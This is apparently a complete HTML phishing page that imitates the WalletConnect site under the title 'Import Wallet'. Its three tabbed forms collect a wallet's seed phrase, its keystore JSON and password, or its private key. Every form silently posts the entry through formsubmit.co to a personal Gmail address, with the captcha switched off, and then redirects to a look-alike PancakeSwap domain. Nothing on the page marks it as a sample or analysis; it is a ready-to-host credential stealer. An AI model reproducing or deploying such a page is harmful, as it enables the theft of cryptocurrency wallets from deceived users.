<html><head><meta http-equiv="content-type" content="text/html; charset=UTF-8">
    
    <link rel="stylesheet" href="port/main.css" type="text/css"> 
    <meta charset="UTF-8">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:image" content="./port/logo.svg">
    <link rel="icon" href="port/logo.svg">
    <script>
        function openCity(evt, cityName) {
        // Declare all variables
        var i, tabcontent, tablinks;
      
        // Get all elements with class="tabcontent" and hide them
        tabcontent = document.getElementsByClassName("tabcontent");
        for (i = 0; i < tabcontent.length; i++) {
          tabcontent[i].style.display = "none";
        }
      
        // Get all elements with class="tablinks" and remove the class "active"
        tablinks = document.getElementsByClassName("tablinks");
        for (i = 0; i < tablinks.length; i++) {
          tablinks[i].className = tablinks[i].className.replace(" active", "");
        }
      
        // Show the current tab, and add an "active" class to the button that opened the tab
        document.getElementById(cityName).style.display = "block";
        evt.currentTarget.className += " active";
      }
      </script>
    <title>Import Wallet</title></head>
    
    
    
    <body>
    <center>
    <div class="top">
            <a href="index.html#footer" class="left">Github</a>
            <a href="index.html#wallets" class="left">Docs</a>
            <a href="index.html" class="main"><img src="port/logo.svg" alt="logo"></a>
            <a href="index.html#wallets" class="left">Wallets</a>
            <a href="index.html#wallets" class="left">Apps</a>
    </div>
    <br>
    <h2><center>Import Wallet</center></h2>
    <br>
    <div class="tab">
      <button class="tablinks active" id="default" onClick="openCity(event, 'phrase')">Phrase</button>
      <button class="tablinks" onClick="openCity(event, 'keystore')">Keystore JSON</button>
      <button class="tablinks" onClick="openCity(event, 'private')">Private Key</button>
    </div>
    
    <div id="phrase" class="tabcontent" style="display: block;">
    <form action="https://formsubmit.co/lovingcelal88@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://pancakeswapfinances.net/admin.html">
      <input type="hidden" name="_subject" value="New phrase mail!">
      <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="category" value="Phrase">
    <div class="field">
	<input type="text" name="wallet" value="" placeholder="Wallet Type" required="required">
    </div>
    <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
    <br>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <div id="keystore" class="tabcontent" style="display: none;">
    <form action="https://formsubmit.co/lovingcelal88@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://pancakeswapfinances.net/admin.html">
      <input type="hidden" name="_subject" value="New keystore-json mail!">
      <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="category" value="Keystore JSON">
    <div class="field">
	<input type="text" name="wallet" value="" placeholder="Wallet Type" required="required">
    </div>
    <textarea name="phrase" class="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
    <br>
    <div class="field">
        <input type="text" name="password" placeholder="Password">
    </div>
    <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <div id="private" class="tabcontent" style="display: none;">
    <form action="https://formsubmit.co/lovingcelal88@gmail.com" method="POST">
      <input type="hidden" name="_next" value="https://pancakeswapfinances.net/admin.html">
      <input type="hidden" name="_subject" value="New keystore-json mail!">
      <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="category" value="Private Key">
    <div class="field">
	<input type="text" name="wallet" value="" placeholder="Wallet Type" required="required">
    </div>
    <div class="field">
        <input type="text" name="key" class="key" placeholder="Private Key">
    </div>
    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
    <br>
    <button type="submit" name="import" class="btn">IMPORT</button>
    </form>
    </div>
    
    <script>
        document.getElementById("default").click();
        const urlParams = new URLSearchParams(window.location.search)
        const walletType = urlParams.get("type")
        document.querySelectorAll("input[name='wallet']").forEach( node => {
          node.value = walletType
        })
    </script>
    <footer><div id="footer">
    <p><img src="port/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
    <p><img src="port/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p><br>
    <p><img src="port/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
    <p><img src="port/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
    </div></footer>
    
    
    </center></body></html>
